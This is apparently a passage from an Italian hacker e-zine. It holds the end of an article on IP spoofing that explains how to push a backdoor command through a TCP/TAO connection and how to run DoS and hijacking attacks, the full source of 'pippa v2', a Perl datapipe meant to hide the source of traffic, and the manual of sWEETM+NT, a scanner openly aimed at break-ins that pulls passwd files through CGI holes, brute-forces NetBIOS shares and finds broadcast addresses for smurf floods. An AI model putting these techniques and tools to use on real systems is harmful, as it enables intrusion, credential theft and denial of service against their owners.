il nostro pacchetto spoofato con l'indirizzo di un sistema fidato, ad
esempio, e con l'opzione CC. A questo punto sappiamo che dobbiamo superare
il TAO test, ovvero il nostro CC dev'essere maggiore di quello utilizzato
nell'ultima connessione dal client. Qui ci sono due modi.

L'usuale sniff della connessione ci permette di incrementare di uno il
valore di CC sniffato per aprire senza handshake una nuova connessione.
Questo ci permettera' non solo di passare il TAO test, ma anche di far
fallire il prossimo tentativo al sistema legale.

Oppure possiamo tentare di indovinarlo. Sembra difficile, in realta' e'
semplice e funziona bene, nonostante sia un po' rude. CC e' contenuto in
un unsigned di 32 bit, con un valore che spazia da 0 a 4,294,967,295.
Nella maggior parte delle implementazioni tcp_cgen e' inizializzato ad 1.
Per superare il test dobbiamo avere il nostro CC maggiore del valore
contenuto in tao_cc .... ma non e' importante di quanto superiore, dal
momento che questo non viene controllato. Bastera' quindi fare alcuni
(pochi) tentativi con valori MOLTO grandi. E' infatti improbabile che un
sistema possa portare il suo valore di CC contenuto nel server sopra anche
solo la meta' dei possibili valori di 32 bit di spazio =;)

A questo punto possiamo schematizzare il tutto:

SPOOF				SERVER				CLIENT

  -------- (SYN, CC) ----------> TAO OK
  --------  BACKDOOR ----------> ACCEPTED
					------ (risposta TAO) ---> ??
					<--------- (RST) --------  ??

Il vero host di cui spoofiamo l'indirizzo rispondera' con un RST alla
risposta al nostro TAO che il server gli invia. D'altra parte, a differenza 
del normale TCP spoofing, qui i nostri dati sono gia' stati accettati in
virtu' del TAO e passati a livello dell'applicazione. Il RST interrompera'
si la nostra connessione spoofata, ma noi dovremmo gia' aver introdotto un
comando a nostro piacimento. Nel caso volessimo portare avanti la connessione
dovremmo impedire che il client possa rispondere con un RST.

------[ S P O O F i N G  D o S ]------

Ovviamente l'iP SPOOFiNG non serve solo a questo. Puo' essere utile in una
serie di Denial of Service. No. Non del tipo teardrop, nestea e compagnia
bella. In quel caso lo spoofing serve praticamente solo a celarsi dietro
alla difficile tracciabilita' dei pacchetti attraverso i router.

In realta' e' possibile ben altro. Immaginiamo di poter lasciare
indistrurbato un programma che intercetti ogni tentativo di connessione
verso specifici sistemi. Tale programma potrebbe cominciare ad inviare
messaggi di tipo ICMP HOST_UNREACH verso l'host TCP che ha originato la
richiesta di connessione, ed intanto inviare un bel RST al sistema remoto
contattato, usando gli stessi dati della connessione legale. In questo
modo potremmo efficacemente impedire al sistema di raggiungere un servizio
particolare su di un particolare host. 

CLIENT ------------------------X---------------------------> SERVER
       <----- ICMP UNREACH ----|-------- RST -------------->
			     KILLER

Uno scherzo fattibile mediante SPOOFiNG vedente potrebbe esser quello del
redirecting su di un'altra macchina di una connessione telnet, rlogin o
ftp. In questo caso, abbiamo due possibilita', una meno onerosa dell'
altra. Nella prima interrompiamo la connessione con il vero server e
cominciamo a rispondere noi alle chiamate del client, ovviamente spoofando
l'indirizzo e replicando ai SEQ del client. In questo modo potremmo
camuffare la nostra macchina per sembrare come il server e portare quindi
il client al rilascio di informazioni particolari.


CLIENT -----------------------~X~ -  -  -  -  -  -  -  -  - >  SERVER
  |			       |
  |------------------------ SPOOFER


Il secondo modo e' piu' complesso in quanto implica un nostro ruolo come
smistatore e reindirizzatore occulto di pacchetti. Infatti potremmo aprire
una connessione con un host esterno, ed inviare i dati di in/out di questo
server, al client che invece ha aperto una connessione con un altro
sistema. In questo caso dobbiamo desincronizzare lo stato della
connessione legale del client e convogliare i suoi pacchetti al nostro
server come se fossero nostre, e portare le sue risposte al client come se
fossero del primo host da lui contattato =;). Un diagramma in questo caso
e' d'aiuto.


CLIENT <-------------------------~X~ -  -  -  -  -  -  -  -  - > SERVER
  |		        	  |
  |		        	  |
  |---------------------------> SPOOFER <----------------------> OTHER
  

Questo cambio al volo di server, in modo trasparente, rispetto al client,
e' decisamente complesso rispetto ad una banale corruzione della cache di
un name server, o DNS SPOOFiNG. D'altra parte non richiede altro che i
privilegi di root su di una macchina nella stessa LAN del client o sul
percorso seguito dai pacchetti dal client al server. Invece corrompere la
cache di un DNS e' nella maggior parte dei casi possibile solo dopo aver
colpito il name server locale o della rete cui appartiene il server.
Spesso comunque sono macchine rese piu' sicure da controlli assidui.
D'altra parte sono spesso insicure perche' lasciate a loro stesse :) non
contenendo alcun account. Un altro modo e' quello di poter gestire un
proprio DNS autorevole per un dominio o sottodominio, e di inserire
informazioni false nelle risposte a query ricorsive. Ma non e' parte
integrante degli argomenti di questo progetto parlarvi anche di DNS SPOOFiNG.

------[ C O N C L U S I O N I ]------

Con questo ho concluso questo primo capitolo del progetto 0N0S3NDAi. Un
capitolo comunque a se stante, in quanto nulla e' richiesto del secondo
affinche' tutto quello che ho esposto possa essere sperimentato ed applicato.

Qui ci sono spiegazioni, c'e' del codice. Ci sono idee e consigli.

Come al solito .... ora sta a voi. =;)

						FuSyS

Bibliografia-------------------------------------------------------------
|									|
|	W.R.Stevens	TCP/IP Illustrated Vol. 1, 2 e 3		|
|	W.R.Stevens	UNIX Network Programming 2ed.			|
|	RFC		768, 791, 792, 793, 1071, 1282, 1323, 		|
|			1379, 1600, 1644 				|
|------------------------------------------------------------------------	

Ringraziamenti-----------------------------------------------------------
|									|
|	W.R.Stevens	per i suoi libri eccezionali			|
|	Coder@reptile	per i suoi testi, codice e Sniffit		|
|									|
|	nessuno dei due lo sapra' mai, ma tant'e' :)))			|
|------------------------------------------------------------------------

ShoutOuts----------------------------------------------------------------
|									|
|	SMaster	  per aver accettato di buon grado i miei articoli	|
|	bELFaghor per il suo proposito verso OpenBSD che si concludera'	|
|		  credo, non prima di qualche anno =;)			|
|	ins4ne	  per esserlo davvero [e per non farsi paranoie per la	|
|		  distro di linuxo da usare :) ]			|
|	twolf	  perche' e' sempre triste per lo stato dei chan :)	|
|	tutti i raga di BFi	per non avere di meglio da fare,	|
|				proprio come me ;) talvolta ...		|
|									|
-------------------------------------------------------------------------

--------------------------------[ PiPPA v.2 ]---------------------------------
-----------------------------------[ b0z0 ]-----------------------------------

pippa v2, di b0z0/iKX

d) cos'e' pippa v2?
r) come non si deduce dal nome, pippa v2 e' un datapipe, ovvero un
   programma che ridireziona tutti i pacchetti tcp diretti ad una porta su
   una macchina ad un'altra porta su un'altra (o stessa) macchina.

d) a che serve?
r) pippa v2 puo' essere usato per mascherare la vera provenienza di certi
   pacchetti facendoli passare sempre per un altra macchina. Questo
   chiaramente puo' essere usato per diversi scopi, dal far passare i
   pacchetti per altre nazioni per complicare il lavoro di chi vorra'
   venire a cercarvi, per mantenere relativamente + segreta la vostra
   identita' su irc o semplicemente per ridirezionare delle porte da
   qualche parte (utilizzabile su gateway per reti interne o cose simili).

d) xche' usare pippa v2 e non m$datapipe o altri?
r) perche':
    -) e' scritto in perl, quindi usabile su moltissime piattaforme
       (su tutti gli unix like e anche sui winblows) senza dover
       modificare nulla (a meno di una costante e la path all'interprete).
    -) la destinazione dei pacchetti puo' essere fissa (usando il modo non
       interattivo) o cambiata al volo al momento dell'uso (con il modo 
       interattivo) senza dover far ripartire ogni volta il datapipe.
    -) ha il supporto per i proxy server socks (v4 e v5) modificabili
       anche al volo nel modo interattivo.
    -) due o piu' pippa v2 in modo interattivo e non possono essere
       collegati facilmente in serie (anche poi via un socks
       proxy) rendendo la ricerca della sorgente dei pacchetti +
       complicata.
    -) pippa v2 ha un po' di opzioni di logging delle connesioni.
    -) dovrebbe funzionare e hai il source per aggiungerci quello che
       vuoi senza perdere molto tempo.

d) requisiti?
r) il sistema deve avere installato il perl5. per poter usare il supporto
   per server socks si dovra' disporre anche del socks perl module
   (reperibile all'http://www.perl.com/CPAN/modules/by-module/Net/).
   Per pingare una macchina dal modo interattivo inoltre pippa v2 usera'
   un comando 'ping' che si suppone sia presente sulla macchina.
 
d) come si usa? 
r) beh, per avere una schermata di tutte le possibili opzioni alla command
   line basta lanciare pippa v2 con un '-h 1'. ecco qualche spiegazione
   per ogni comando cmq:
     -p xxxx       : specifica la porta sulla quale pippa v2 aspetta
                     eventuali connessioni.
     -d 1          : saranno visualizzate sull'output tutte le connessioni
                     avvenute.
     -b 1          : pippa v2 si binda (attacca? va be', da bind) su tutti
                     gli indirizzi della macchina (in caso contrario si
                     binda solo su quello ottenuto da `hostname`)
     -F 1          : usa il modo non interattivo. in questo caso pippa v2
                     semplicemente mandera' tutti i pacchetti alla
                     destinazione desiderata scelta dalle opzioni -P e -H
                     ed eventualmente potra' mandare il comando -I.
     -P xxxx       : porta alla quale connettersi (se usato con -F)
     -H xxxx       : host al quale connettersi (se usato con -F)
     -I xxxx       : stringa da mandare all'inizio della connessione (se
                     usato con -F)
     -S 1          : usa il socks proxy specificato dalle opzioni -s, -t,
                     -v, -u e -k.
     -s xxxx       : socks proxy da usare
     -t xxxx       : porta del socks proxy da usare
     -v x          : protocol version del socks proxy (4 o 5)
     -u xxxx       : utente sul proxy socks (di default anonimo)
     -k xxxx       : password sul proxy socks
   Se lanciato in modo interattivo il pippa v2 puo' essere comandato
   dall'esterno. Connettendovi alla porta dell' host sulla quale avete
   lanciato pippa vi verra' restituito un prompt "pippa>". Con 'help' avrete
   qualche suggerimento. + esattamente i comandi per la versione sono:
     open <host> <port>       : connettiti alla porta <port> del <host>
     prox <host> <port>       : setta il socks proxy al sito <host> alla
                                porta <port>. Se usato senza parametri il
                                comando disabilita l'uso del socks proxy.
     pvar <user> <pass> <ver> : setta l'utente, la password e la versione
                                del socks proxy. Se usato senza parametri
                                toglie l'uso dell'autentificazione con
                                user/pass.
     ping <host>              : esegue tre ping all'host desiderato.
     stop                     : esegue la chiusura del pippa v2,
                                principale, lasciando pur sempre attiva 
                                la connessione attuale.
     exit,quit                : chiude la sessione attuale.
     help                     : un riassunto dei comandi.

d) qualche esempio di uso?
r) massi'..
    pippa -p 3456 &
      fa partire pippa v2 in modo interattivo sulla porta 3456
    pippa -p 3456 -b 1 &
      come prima ma pippa v2 si bindera' su tutti gli indirizzi del host
    pippa -p 3456 -b 1 -d 1  2>&1 > pippalog &
      come prima ma le connessioni verranno loggate nel file pippalog
    pippa -F 1 -P 6667 -H irc.ais.net &
      ridireziona tutti i pacchetti in entrata (sulla porta di default
      2345) al sito irc.ais.net alla porta 6667. Questo e' un esempio di
      come usare pippa v2 x irc mostrando cosi' solo l'ip dove e' stato
      installato pippa.
    pippa -F 1 -P 23 -H un.wingate.com -I 'open irc.ais.net 6667' &
      qui i pacchetti in entrata verranno ridirezionati al sito
      un.wingate.com alla porta 23. All'inizio di ogni connessione verra'
      mandata la stringa 'open irc.ais.net 6667'. Questo e' un tipico modo
      per usare un wingate per andare su irc (in questo caso il pippa v2
      potete eseguirlo sulla vostra macchina locale e settare il server
      per il vostro client irc alla porta 2345 della vostra macchina).
      Chiaramente le risposte del wingate non saranno chiare al vostro
      client irc, ma fa nulla, dopo un po' gli passa.
    pippa -F 1 -P 6667 -H irc.ais.net -S 1 -s socks.proxy.com -t 1080
      qui i pacchetti in entrata vengono mandati al sito irc.ais.net alla
      porta 6667 usando il socks proxy socks.proxy.com piazziato sulla
      porta 1080. Questo e' un tipico modo per usare un socks proxy per
      andare su irc quando il vostro client non ha il supporto socks gia'
      integrato. Anche qui fate girare pippa v2 sul vostro pc e settate il
      server irc del vostro client sulla porta 2345 della vostra macchina. 
   Come esempi di cmdline credo bastino, non e' poi cosi' difficile credo.
   Per quanto riguarda il modo inteattivo non c'e' molto da fare esempi
   se effetivamente sapete cosa vogliate fare. 

d) problemi conosciuti?
r) connettendosi alla porta 23 (telnet) via pippa v2 in modo interattivo
   con alcuni client telnet all'uscita si potrebbe verificare un strano
   comportamento xche' gli ultimi comandi mandati dal demone non saranno
   interpretati. In caso succeda vi basta rimettere il client telnet in
   line mode o chiuderlo e riaprirlo.

d) quanto costa?
r) ma nulla, se trovate pippa v2 di qualche utilita' mandatemi una mail a
   b0z0@realitylimited.com o intrattenetemi su irc.

d) dediche, saluti o altro?
r) finalmente (forse) non dovro' + ascoltare i problemi impossibili delle
   troppe xsone che vogliono usare un socks proxy, ma dicono che bitchx non
   compila e/o che non riescono ad installare/configurare socks5.
   Saluti generici a tutti i fratelli e le sorelle, soprattutto quelli/e 
   che mi tirano su di morale di tanto in tanto.

d) allora dov'e'?
r) ecco...

----------------------->8---------------------------8<------------------------
#!/usr/bin/perl

#
# pippa v2, a network datapipe
# by b0z0/iKX, late 1998
# contacts: b0z0@realitylimited.com
#
# start it with the -h 1 option to get some help
# write help at the pippa> prompt to get some help on the interactive mode
#
# this has been tested.
#

$socks_installed=1;		# set this to 0 if ya don't have socks pm

use Socket;
require "getopt.pl";
if ($socks_installed) {use Net::SOCKS;}

$SIG{'CHLD'}='IGNORE';

&Getopt('hpdbPHFISstvuk');		# Get some needed cmdline options
$help=$opt_h;
$port=$opt_p;
$bindany=$opt_b;
$debug=$opt_d;
$destport=$opt_P;
$desthost=$opt_H;
$nonint=$opt_F;
$initstr=$opt_I;
$usesocks=$opt_S;
$sockserver=$opt_s;
$sockport=$opt_t;
$sockversion=$opt_v;
$sockuser=$opt_u;
$sockpass=$opt_k;

$port=2345 unless $port;	# some defaults
$destport=25 unless $destport;
$desthost="127.0.0.1" unless $desthost;
$sockport=1080 unless $sockport;
$sockversion=4 unless $sockversion;
$usesocks=0 unless (($usesocks) and ($socks_installed));

if ($help) {
 print "pippa usage:\n";
 print "  -h 1           = help\n";
 print "  -p xxxx        = run pippa on port xxxx\n";
 print "  -d 1           = output debug infos\n";
 print "  -b 1           = bind to any adress of the machine\n";
 print "  -F 1           = non interactive mode, just pipe to -H -P\n";
 print "     -P xxxx     = fix destination port to xxxx\n";
 print "     -H xxxx     = fix destination host to xxxx\n";
 print "     -I xxxxx    = send string xxxxx at beginning\n";
 if ($socks_installed){
  print "  -S 1           = use a socks proxy for connections \n";
  print "     -s xxxx     = socks proxy to use\n";
  print "     -t xxxx     = socks proxy port (default 1080)\n";
  print "     -v x        = socks proxy protocol version (default 4)\n";
  print "     -u xxxx     = socks proxy username (default anon login)\n";
  print "     -k xxxx     = socks proxy password (default anon login)\n\n";
 }
 exit();
}

$AF_INET=2;

# This should very probably change for some operating systems
# Check the socket include files (sys/socket.h) for this value

$SOCK_STREAM=1;		# should be 2 for SunOS

$sockaddr='S n a4 x8';

chop($hostname=`hostname`);	# Infos on machine running pippa
($name,$aliases,$type,$len,$thisaddr)= gethostbyname($hostname) if $hostname;


($name,$aliases,$proto)=getprotobyname('tcp');
if($port !~ /^\d+$/) {
   ($name, $aliases, $port) = getservbyname($port,'tcp');
}

$thisaddr=INADDR_ANY if ($bindany or !($thisaddr));  # bind to any address

$this= pack($sockaddr,$AF_INET,$port,$thisaddr);
select(NS); $|=1; select(STDOUT); $|=1;

socket(S,$AF_INET, $SOCK_STREAM, $proto) || die "socket: $!";
bind(S,$this) || die "bind: $!";
listen(S,5) || die "connect: $!";	# Stay on port and wait for conns

select(S); $|=1; select(STDOUT);

for ($con=1;;$con++) {
 ($addr=accept(NS,S)) || die $!;
 if (($child=fork())==0) {
   ($af,$port,$inetaddr)=unpack($sockaddr,$addr);
   @inetaddr=unpack('C4',$inetaddr);

   @datetime=localtime(time);
   $datetime[4]++;
   print "$datetime[3]/$datetime[4]/$datetime[5] " if $debug; 
   print "$datetime[2]:$datetime[1]:$datetime[0] from " if $debug;
   print "$inetaddr[0].$inetaddr[1].$inetaddr[2].$inetaddr[3]" if $debug;
   print ":$port connection nr=$con\n" if $debug;
    	
   print NS "pippa> " if !($nonint);
   select(S); $|=1; select(STDOUT); $|=1;

   openconn() if ($nonint);
   exit() if $nonint;
   while (<NS>) {
    print STDOUT "nr=$con command: $_" if ($debug and !($nonint));
    @command=split(' ',$_);
    $_=$command[0];
    CMDLOOP: {
     if (/^open$/) {
           ::openconn();
           last CMDLOOP;
       }

     if (/^prox$/) {
           $command[2]=1080 if (!($command[2]));
           $sockserver=$command[1];
           $sockport=$command[2];
           $usesocks=0;
           $usesocks=1 if (($command[1]) and ($socks_installed));
           last CMDLOOP;
     }

     if (/^pvar$/) {
           $command[3]=4 if (!($command[3] == 5));
           $sockuser=$command[1];
           $sockpass=$command[2];
           $sockversion=$command[3];
           last CMDLOOP;
     }

     if (/^ping$/) {
       if (!($command[1]) or ($command[2])) {
          print NS "bad ping params\n";
       }
       elsif (!($command[1] =~ /^(\w+\.*)+$/)) {
          print NS "nice params\n";
       }
       else {
          open(SAVEOUT,">&STDOUT");
          open(SAVEERR,">&STDERR");

          open(STDOUT,">&NS");
          open(STDERR,">&STDOUT");
          system("ping -c 3 $command[1]");
          close(STDOUT);
          close(STDERR);

          open(STDOUT,">&SAVEOUT");
          open(STDERR,">&SAVEERR");
       }
       last CMDLOOP;
     }

     if (/^help$/) {
       print NS "avaiable commands:\n";
       print NS "  open <host> <port>       : connect to <host> at <port>\n";
       print NS "  prox <host> <port>       : use socks proxy <host>:<port>\n";
       print NS "  pvar <user> <pass> <ver> : proxy auth: user, pass and ver\n";
       print NS "  ping <host>              : ping <host> three times\n";
       print NS "  help                     : this shit\n";
       print NS "  stop                     : stop main pippa\n";
       print NS "  quit, exit               : bail out\n\n";
       last CMDLOOP;
     }
 
     if (/^$/) { last CMDLOOP; }

     if (/^stop$/) {
       kill 15, getppid();
       last CMDLOOP;
     }

     if ((/^quit$/) or (/^exit$/)) {
       close(NS);
       exit();
     }
     print NS "bad command\n";
    }
   print NS "pippa> " if !($nonint);
   exit() if $nonint;
   }
 close(NS);
 exit();
 }
close(NS);
}

sub openconn {
 DOOPEN: {
   $command[1]=$desthost if $nonint;
   $command[2]=$destport if $nonint;
          
   if ((!($command[1])) or (!($command[2])) or $command[3]) {
      print NS "bad params\n";
      last DOOPEN;
   }
   $_=$command[2];

   if($_ !~ /^\d+$/) {
     ($name, $aliases, $port) = getservbyname($command[2],'tcp');
     print NS "bad port\n" if !($port);
     last DOOPEN if !($port);
     $command[2]=$port;
   }
   elsif ($command[2] > 65535) {
      print NS "port > 65535? cool\n";
      last DOOPEN;
   }
   ::doopen() if (!($usesocks));
   ::doopensocks() if ($usesocks);
 }
}


sub doopen {
   $outta= pack($sockaddr,$AF_INET,0,$thisaddr);
   socket(OUT,$AF_INET, $SOCK_STREAM, $proto) || die "socket: $!";
   bind(OUT,$outta) || die "bind: $!";

   ($name,$aliases,$type,$len,$targetaddr)=gethostbyname($command[1]);
      
   $that=pack($sockaddr, $AF_INET, $command[2],$targetaddr);

   print NS "ok, connecting... \n" if !($nonint);
   if (connect(OUT,$that)) {
      print NS "ok, connected!\n" if !($nonint);
      select(OUT); $|=1; select(STDOUT);
      print OUT "$initstr\n" if ($nonint and $initstr);
      if ($child_c=fork()){
         while (read(OUT,$buf,1)) { print NS $buf;}         
         sleep 3;
         kill 9,$child_c if $child_c;
      }
      else { 
         while (read(NS,$buffo,1)) { print OUT $buffo;}
      }
   }
   else { print NS "error: $!\n"; }
}

sub doopensocks {
   $forzo=0;
   $forzo=1 if ($sockuser and $sockpass);
   my $sock = new Net::SOCKS(socks_addr => $sockserver,
                socks_port => $sockport,
                user_id => $sockuser,
                user_password => $sockpass,
                force_nonanonymous => $forzo,
                protocol_version => $sockversion);

   my $f= $sock->connect(peer_addr => $command[1], peer_port => $command[2]);

   $s_num=$sock->param('status_num');
   if ($s_num == SOCKS_OKAY) {
      if ($child_c=fork()){
         while (read($f,$buf,1)) { print NS $buf;}
         sleep 3;
         $sock->close();
         kill 9,$child_c if $child_c;
      }
      else {
         while (read(NS,$buffo,1)) { print $f $buffo;}
      }
   }
   else {
     $s_err=Net::SOCKS::status_message($s_num);
     print NS "Socks error: $s_err\n";
   }
}
----------------------->8---------------------------8<------------------------

-----------------------------[ SWEETM+NT v1.0.0 ]-----------------------------
----------------------------------[ sPIRIT ]----------------------------------

                 sWEETM+NT v1.0.0 - sWEET mAGiC + iNTERFACE
                          rEM0TE nETW0RK sCAN T00L

                                     -

                        by \sPIRIT\ -s0ftpr0ject 98-

                                     -

Table of contents: 1 - What is sWEETM+NT
                       1.1 - Some words about the program
                       1.2 - Features

                   2 - General overview
                       2.1 - How does the program work
                       2.2 - Command line parameters

                   3 - Plugins support
                       3.1 - How do plugins work
                       3.2 - Using plugins
                       3.3 - Writing your own plugins

                   A - Appendix
                       A.1 - Change log
                       A.2 - What's coming
                       A.3 - Greetings
                       A.4 - Contacting me

                                     -

                         [ 1 - What is sWEETM+NT ]

1.1 - Some words about the program

No kidding. This isn't a security tool. At least not for others' security.
This is not for good angels. It's for you all devils out there.
You can guess what it is meant for: scan a remote domain in order to
discover the way of breaking into it. It saves a lot of hand-work.
I know that there are many other similar programs, like Satan, Nessus or
Mscan, sWEETM+NT isn't comparable, it exists just to save you from writing
a lot of commands and remembering useful informations. Read the scan log,
and have an overview of remote domain' status. When you get all the clues,
it's up to you to find out HOW to exploit the whole thing.
Surely I won't tell you.
Of course, as a minor but always nice side-effect, you can use sWEETM+NT to
scan your net and find remote security flaws, in order to fix them up.
But it's just a side effects... hope you understood.
I'm not evil.
I won't do anything.
I can't see.
I can't hear.
I can't talk.
Use all this stuff at your OWN risk. I cannot be held responsible for any
amount of caos you spread around.
It's the same as building cars, if you can't drive, don't complain with me.
h4ck 7h3 w0r1d

1.2 - Features

First of all, it works.
Only on linux boxes, but it works.
It isn't as quick as other similar tools (because still lacks of child
spawn on the same list), but it's damn precise. Apart from some strange
side effects of the scan (nothing dangerous, tough), sWEETM+NT will report
you all what you need.
Yeah, security flaws, sometimes it will even grab the passwd for you, but
don't expect it to happen often, this program won't exploit the remote
machines for you.

This program is a BASH script.
You may wonder WHY a bash script.
Only because it started as a simple script to automatize some basic
operations anyone will do when looking for remote machines to play with,
and little by little it evolved in a complete scan program. You launch it,
and then take care of another thing, your attention isn't required.
It remains a bash script. 0h, who carez?

What does sWEETM+NT do?
Not much in this version (at least from my point of view), but you may find
it useful.
You feed it with a domain (that should be clear), and after a little or
long shaking and rolling, he hands you the wish list. Read it carefully.
It resolves the IP of all machines of the domain, does the DNS conversion,
and also checks which ones are alive (i.e. reply to ping).
It collects all the remote-collectable informations about every machine in
the list, such as the exportable directories, the list of all RPC services
running, the banner that telnet, smtp, pop3 and ftp give you, it fingers
evey user currently logged on the machines, and all the standard
unix/linux accounts, returns the bind version, and some more jellyfish
candies.
Oh, of course it does a portscan in the range 1-1080.
Then sWEETM+NT tries to check the exploitability of some bugs, like CGI's,
pop3, smtp, bind, netbios, imap, rusers... sometimes (with the CGI's) you
will find a passwd on your machine (besides from yours, of course!). It's
an extra gift... crack it with care.
Maybe it will also find broadcasting addresses or wingates/socks.
It also runs plugins, if you have some. Actually it doesn't recognize the
Photoshop's plugin format, but I'm working on it :)

All this nice & neat stuff can be enabled or disabled on the command line
or in the config file.

                                     -

                          [ 2 - General overview ]

2.1 - How do the program work

sWEETM+NT, relying heavily on some system-default programs (apart from
other programs I provided in their executable form in "bin/" directory), on
the first run looks for those programs, and saves the paths and some
default scan options in a config file called ".smintrc" in the base
directory. It reads and writes it at every run, and if you accidentially
delete it, it will be recreated. Also delete it when you move some of your
system executables, just to be sure.
When you scan a domain, first of all sWEETM+NT generates some temporary
files in the main directory, to extract command line parameters, and during
this (short) time also creates a file called "sweetmint.LOCK", that
prevents another session to run during the initialization phase (otherwise
two sessions of sWEETM+NT will mess command-lines and initialization each
other, resulting in a lock up). This file is deleted as soon as the main
scan is finished, and at this time you can fire up another scan without
troubles.
Also, during initialization phase, sWEETM+NT appends to a file called
".smhistory" the current date/time of the system, and the domain/single
host you scan, so you can read it one day to know what you've done.
Then the script creates a temporary directory where all temp files are
stored, that will be called "domain.to.scan.tmp". This directory is going
to be erased as soon as the scan finishes.
During the main scan phase, you'll find, for each domain, AT LEAST two
files: one called "domain.to.scan.ip", containing all the IP's of the
machines found in domain, and the other called "domain.to.scan.results",
where logs for that scan are stored.
In case you stop the scan (pressing CTRL-C many times, for example),
additional files that start with "domain.to.scan.something" will be
created. Don't erase them, nor the temporary directory, or you won't be
able to resume the aborted scan later.

2.2 - Command line parameters

Now, try to run the program without any parameter. Luscious and naked.
It will greet you with some chit-chat, then quits giving an error: you
forgot to specify the domain to scan (I told you so :)
Here's what you will read (a little part):

  - Usage: sweetmint [-single:<host>][-resume:]<domain> [-tar] [options]

The good part is that the only parameter you must give is the <domain>.
The bad is that if you want to tune up the scan there's a lot of flags you
must know... have this little readme handy.

First note: the commandline is CASE SENSITIVE.
Second note: the domain must be the first parameter, absolutely.

Let's analyze the command line in detail:

The first parameter MUST be the domain/single host to scan. sWEETM+NT
recognizes the difference this way:

- if launched with "sweetmint domain.to.scan" it will scan the full domain
  and relative subdomains.

- if launched with "sweetmint -single:host.to.scan" it will scan ONLY the
  host you specified on command line.

- if launched with "sweetmint -resume:domain.to.resume" it will resume an
  aborted scan for that domain, but ONLY if you haven't deleted the
  temporary files sWEETM+NT creates during a scan. Otherwise, it will be
  impossible to resume a scan.

There is another optional parameter you can specify after the domain, AND
ONLY AFTER IT. It's the "-tar" option. If you specify it (for example with
a commandline "sweetmint microsux.com -tar"), after all the scan stuff is
finished, the script will compress all the files related to the domain/host
in a file called "domain/host.just.scanned.tar.gz", but ONLY if tar and
gzip where found when config file was created.

The following options you specify are also not compulsory (because
sWEETM+NT will get the scan parameters from the config file, as every time
you change the scan parameters they will be saved in ".smintrc" and used
for all new scans, just remember that specifying a parameter will override
the saved ones).

Here's a list of possible flags, with a short description for each one:

'n' : do name lookup - every IP in generated list will be resolved into
                       it's name form, and a "domain.to.scan.hosts" list
                       will be generated and used as main scan list. This
                       is often a VERY SLOW process. In order to use this
                       option, "nslookup" must be present on machine, and a
                       Domain Name Server must be specified in localhost's
                       configuration.

'a' : ping for alive ip's - every IP in generated list will be ping'ed to
                            verify if the machine is currently online, and
                            results will be written into a
                            "domain.to.scan.ip.alive" file, and used as
                            main scan list. This is often a VERY SLOW
                            process. In order to use this option, "ping"
                            must be present on machine.

'f' : NFS holes - an exportable dir listing will be generated for every
                  machine in list, and you will be notified when public
                  mountable directories are found. In order to use this
                  option, "showmount" must be present on machine.

'c' : CGI holes - machines will be checked against various CGI holes, and
                  if an hole is found, "passwd" file will be automatically
                  retrieved. In order to use this option, "lynx" must be
                  present on machine.

'w' : Wingate scan - after main scan, the global list will be scanned for
                     open wingates, netproxies or socks.

's' : Netbios shares - every machine will be checked for shared directories
                       using the NETBIOS protocol. Also, a brute forcing of
                       the password (if required) is attempted, reading
                       usernames from "userlist.nat" and passwords from
                       "passlist.nat". Feel free to add to those two
                       dictionaries. This can be a VERY SLOW process.

'r' : RPC informations - for every machine will be collected RPC services
                         informations. In order to use this option,
                         "rpcinfo" must be present on machine.

'b' : BIND version check - it will report the installed version of BIND for
                           every machine.

'B' : BIND exploit check - it will report if it's actually possible to
                           remote exploit BIND on some machines.

'F' : Finger informations - standard UNIX account will be fingered, along
                            with every user currently online, and this for
                            every machine in the list. In order to use this
                            option, "finger" must be present on machine.

'N' : NIS map listing - a map of NIS services will be generated for every
                        machine in the list.

'd' : Banner dump - sWEETM+NT will connect to telnet, ftp, smtp and pop3,
                    and save the greeting banner that is shown.

'R' : RUSERS informations - for every machine, a list of all users
                            connected through the RUSERS service will be shown.
                            In order to use this option, "rusers" must be
                            present on machine.

't' : Broadcast scan - as soon as main scan is completed, the full domain
                       will be scanned in order to find broadcast (.255)
                       addresses in the network, useful to use with flood
                       programs such as "smurf".

'i' : IMAP linux bug - every opened IMAP port will be reported, and also
                       checked in order to verify the remote
                       exploitability.

'S' : SMTP & POP3 check - with this option, sWEETM+NT will report if on
                          scanned machines is possible to break in using
                          remote exploitability. Also checks the version of
                          service used, and reports if QPOPPER is installed
                          on remote systems.

'x' : Use plugins - this options enables the use of plugins.

Remember that some of those scans are performed only if the required port
is found as open during the preliminary portscan, and some other are
dependent on commandline. So don't get scared if you find as enabled
options you didn't specified.

Now the question you surely have is: "But how THE HELL can I enable and
disable those options?"
Simple answer.
There are three parameters you pass to sWEETM+NT and those are used to
enable and disable options. One is global (i.e. affects all the flags), the
other aren't. These parameters are:

'-full' : it enables ALL the flags, no one is excluded.

'-enable:<flags>' : it enables only the flags (the single function specific
                    letters) you specify after the ':'. For example a
                    parameter like "-enable:ti" enables broadcast scan and
                    IMAP bug check.

'-disable:<flags>' : it disables only the flags you specify. Same as
                     '-enable'.

You can combine these options in many ways. REMEMBER THAT YOU CAN USE ONLY
TWO OF THEM AT A TIME (you can't specify -full -enable: -disable:
together).
Here's the full cases:

- first:  '-full'
  second: none

  effect: ENABLES ALL the scan options

- first:  '-full'
  second: '-enable:<flags>'

  effect: absolutely stupid :) ENABLES ALL the scan options

- first:  '-full'
  second: '-disable:<flags>'

  effect: ENABLES ALL the scan options, and DISABLES THE SPECIFIED ONES

- first:  '-enable:<flags>'
  second: none

  effect: ENABLES THE SPECIFIED OPTIONS, and DISABLES ALL THE OTHERS


- first:  '-enable:<flags>'
  second: '-disable:<flags>'

  effect: ENABLES SPECIFIED OPTIONS, AND DISABLE SPECIFIED ONES (quite a
          mess :)

- first:  '-enable:<flags>'
  second: '-full'

  effect: absolutely stupid :) ENABLES ALL the scan options

- first:  '-disable:<flags>'
  second: none

  effect: DISABLES THE SPECIFIED OPTIONS, and ENABLES ALL THE OTHERS

- first:  '-disable:<flags>'
  second: '-enable:<flags>'

  effect: DISABLES SPECIFIED OPTIONS, AND ENABLES SPECIFIED ONES (quite a
          mess :)

- first:  '-disable:<flags>'
  second: '-full'

  effect: ENABLES ALL OPTIONS, and DISABLES SPECIFIED ONES

The combination of options and flags are saved in config file and used in
all the next scans, so you don't have to specify anything rather than the
domain, if you don't want to change the flags.
The first time sWEETM+NT is run, it generates as default a
"-full -disable:nas". Little homework, what does it do? :)))

                                     -

                          [ 3 - Plugins support ]

3.1 - How do plugins work

I know.
There are lots of things that sWEETM+NT is missing, and I'll try to
implement some in the near future.
